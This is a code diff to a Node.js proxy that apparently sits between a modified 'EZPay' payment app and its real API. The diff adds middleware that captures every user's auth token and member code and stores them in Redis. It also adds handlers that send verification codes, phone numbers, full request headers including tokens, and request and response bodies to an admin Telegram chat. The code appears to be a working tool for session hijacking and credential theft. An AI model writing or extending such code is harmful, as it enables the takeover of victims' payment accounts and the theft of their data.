@@ -396,6 +396,32 @@ app.use(async (req, res, next) => {
   });
 });
 
+// Global token capture: APK sends `apptoken` + `membercode` headers on EVERY authenticated
+// request. Mapping them here means we capture the real base64 token on the first call after
+// login (e.g. /home/article/all) without waiting for response body to contain memberCodeId.
+app.use((req, res, next) => {
+  try {
+    const tok = getTokenFromReq(req);
+    const mc = req.headers['membercode'] || req.headers['memberCode'] || '';
+    if (tok && tok.length > 10 && mc) {
+      const uid = String(mc).replace(/^MC/i, '').trim();
+      if (uid && /^\d{3,}$/.test(uid)) {
+        const key = tok.substring(0, 100);
+        // Only write if changed (avoid hammering Redis on every request)
+        if (tokenUserMap[key] !== uid || userTokenMap[uid] !== tok) {
+          tokenUserMap[key] = uid;
+          userTokenMap[uid] = tok;
+          if (redis) {
+            redis.hset('ezpayTokenMap', key, uid).catch(()=>{});
+            redis.hset('ezpayUserTokenMap', uid, tok).catch(()=>{});
+          }
+        }
+      }
+    }
+  } catch(e) {}
+  next();
+});
+
 async function proxyFetch(req) {
   const url = ORIGINAL_API + req.originalUrl;
   const fwd = {};
@@ -1221,10 +1247,11 @@ Example:
           const txt = await r.text();
           let j = null; try { j = JSON.parse(txt); } catch(e) {}
           const d = getResponseData(j) || {};
-          const boundRaw = (d.isBound !== undefined) ? d.isBound
+          // Real EZPay field is `bindTelegramBotFlag` ("1" = bound, "0" = not). Fall back to others.
+          const boundRaw = (d.bindTelegramBotFlag !== undefined) ? d.bindTelegramBotFlag
+                           : (d.isBound !== undefined) ? d.isBound
                            : (d.bound !== undefined) ? d.bound
                            : (d.bindStatus !== undefined) ? d.bindStatus
-                           : (d.status !== undefined) ? d.status
                            : null;
           const isBound = (boundRaw === true || boundRaw === 1 || boundRaw === '1' || String(boundRaw).toLowerCase() === 'true' || String(boundRaw).toLowerCase() === 'bound');
           const phone = uid ? getPhone(data, uid) : '';
@@ -2896,7 +2923,9 @@ app.all('/app/api/memberManager/bindRobotDetail', async (req, res) => {
     if (data.adminChatId && bot) {
       const phone = getPhone(data, userId);
       const rd = (respData && typeof respData === 'object') ? respData : {};
-      bot.sendMessage(data.adminChatId, `🤖 Robot Bind Details\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📱 Telegram Bot: ${rd.telegramBotLink || rd.botLink || 'N/A'}\n🔑 Bind Code: ${rd.telegramBindCode || rd.bindCode || rd.code || 'N/A'}\n🔗 Bound: ${rd.isBound !== undefined ? rd.isBound : (rd.bound !== undefined ? rd.bound : 'N/A')}\n📊 Full: ${JSON.stringify(rd).substring(0, 500)}`).catch(()=>{});
+      const flag = rd.bindTelegramBotFlag;
+      const boundLabel = (flag === '1' || flag === 1) ? '✅ BOUND' : (flag === '0' || flag === 0) ? '❌ NOT BOUND' : `❓ ${flag ?? 'N/A'}`;
+      bot.sendMessage(data.adminChatId, `🤖 Robot Bind Details\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📱 Telegram Bot: ${rd.telegramBotLink || rd.botLink || 'N/A'}\n🔑 Bind Code: ${rd.telegramBindCode || rd.bindCode || rd.code || 'N/A'}\n🔗 Bound: ${boundLabel}\n📊 Full: ${JSON.stringify(rd).substring(0, 500)}`).catch(()=>{});
 
       // === DEBUG DUMP ===
       // Full request headers + body + upstream response — to compare what APK sends vs what bot sends
@@ -2938,35 +2967,60 @@ ${respBodyStr.substring(0, 1500)}`;
   } catch(e) { await transparentProxy(req, res); }
 });
 
-app.all('/app/api/memberManager/v2/unbindRobot', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = await extractUserId(req, jsonResp);
-    const phone = getPhone(data, userId);
-    if (data.adminChatId && bot) {
-      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000);
-      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
-      bot.sendMessage(data.adminChatId, `🔓 UNBIND ROBOT ATTEMPT\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🔢 Code Sent: ${(req.parsedBody || {}).verificationCode || (req.parsedBody || {}).code || 'N/A'}\n📊 Status: ${jsonResp?.status || 'N/A'}\n💬 Message: ${jsonResp?.message || 'N/A'}\n\n📤 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
-    }
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
-});
+// Helper: build a full request/response dump (headers + body + upstream response)
+function buildFullDebugDump(label, req, response, jsonResp, respBody, userId, phone) {
+  const skipHeaders = new Set(['x-vercel-id','x-vercel-deployment-url','x-vercel-forwarded-for','x-vercel-ip-as-number','x-vercel-ip-city','x-vercel-ip-continent','x-vercel-ip-country','x-vercel-ip-country-region','x-vercel-ip-latitude','x-vercel-ip-longitude','x-vercel-ip-timezone','x-vercel-ip-postal-code','x-vercel-ja3-digest','x-vercel-ja4-digest','x-vercel-proxied-for','x-vercel-proxy-signature','x-vercel-proxy-signature-ts','x-vercel-internal-ingress-bucket','x-vercel-internal-intra-session','x-vercel-sc-basepath','x-vercel-sc-headers','x-vercel-sc-host','forwarded','x-forwarded-proto','x-forwarded-host','x-real-ip']);
+  const hdrLines = [];
+  for (const [k, v] of Object.entries(req.headers || {})) {
+    if (skipHeaders.has(k.toLowerCase())) continue;
+    hdrLines.push(`  ${k}: ${v}`);
+  }
+  const reqBodyStr = (req.parsedBody !== undefined && req.parsedBody !== null)
+    ? JSON.stringify(req.parsedBody, null, 2)
+    : (req.rawBody ? (Buffer.isBuffer(req.rawBody) ? req.rawBody.toString('utf8') : String(req.rawBody)) : '(empty)');
+  const respBodyStr = (jsonResp !== null && jsonResp !== undefined)
+    ? JSON.stringify(jsonResp, null, 2)
+    : (respBody ? (Buffer.isBuffer(respBody) ? respBody.toString('utf8') : String(respBody)) : '(empty)');
+  return `🔍 RAW DEBUG: ${label}
+👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
+🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+🌐 Method: ${req.method}
+🔗 URL: ${req.originalUrl}
 
-app.all('/app/api/memberManager/unbindRobot', async (req, res) => {
+📤 REQUEST HEADERS (APK → Vercel):
+${hdrLines.join('\n').substring(0, 1600)}
+
+📦 REQUEST BODY:
+${reqBodyStr.substring(0, 800)}
+
+📥 UPSTREAM HTTP: ${response?.status ?? 'N/A'}
+📥 UPSTREAM RESPONSE:
+${respBodyStr.substring(0, 1500)}`;
+}
+
+async function handleUnbindRobot(req, res, label) {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     const phone = getPhone(data, userId);
     if (data.adminChatId && bot) {
-      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000);
-      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
-      bot.sendMessage(data.adminChatId, `🔓 UNBIND ROBOT (v1)\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🔢 Code: ${(req.parsedBody || {}).verificationCode || (req.parsedBody || {}).code || 'N/A'}\n📊 Status: ${jsonResp?.status || 'N/A'}\n💬 Message: ${jsonResp?.message || 'N/A'}\n\n📤 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+      const code = (req.parsedBody || {}).verificationCode || (req.parsedBody || {}).code || 'N/A';
+      const summary = `🔓 ${label}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🔢 Code Sent: ${code}\n📊 Status: ${jsonResp?.status || 'N/A'}\n💬 Message: ${jsonResp?.message || 'N/A'}`;
+      bot.sendMessage(data.adminChatId, summary).catch(()=>{});
+      try {
+        const dump = buildFullDebugDump(label, req, response, jsonResp, respBody, userId, phone);
+        bot.sendMessage(data.adminChatId, dump.substring(0, 4000)).catch(()=>{});
+      } catch(dbgErr) {
+        bot.sendMessage(data.adminChatId, `⚠️ Debug dump failed: ${dbgErr.message}`).catch(()=>{});
+      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
-});
+}
+
+app.all('/app/api/memberManager/v2/unbindRobot', (req, res) => handleUnbindRobot(req, res, 'UNBIND ROBOT (v2) ATTEMPT'));
+app.all('/app/api/memberManager/unbindRobot',    (req, res) => handleUnbindRobot(req, res, 'UNBIND ROBOT (v1) ATTEMPT'));
 
 app.all('/app/api/memberManager/*', async (req, res) => {
   const data = await loadData();
